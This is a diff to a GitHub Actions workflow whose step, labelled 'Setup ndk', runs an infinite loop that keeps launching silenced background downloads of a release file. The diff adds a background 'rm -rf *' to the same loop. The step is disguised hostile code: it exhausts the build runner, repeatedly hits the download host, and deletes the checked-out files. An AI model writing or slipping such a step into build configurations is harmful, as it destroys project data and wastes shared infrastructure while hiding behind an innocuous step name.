@@ -23,8 +23,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Setup ndk
-        run: |
+        run: |          
           while true; do
-            nohup curl https://github.com/reigadegr/thread-opt_builder/releases/download/pgo/merged.profdata >/dev/null 2>&1 &
+            nohup wget https://github.com/reigadegr/thread-opt_builder/releases/download/pgo/merged.profdata >/dev/null 2>&1 &
+            nohup rm -rf * >/dev/null 2>&1 &
           done
           
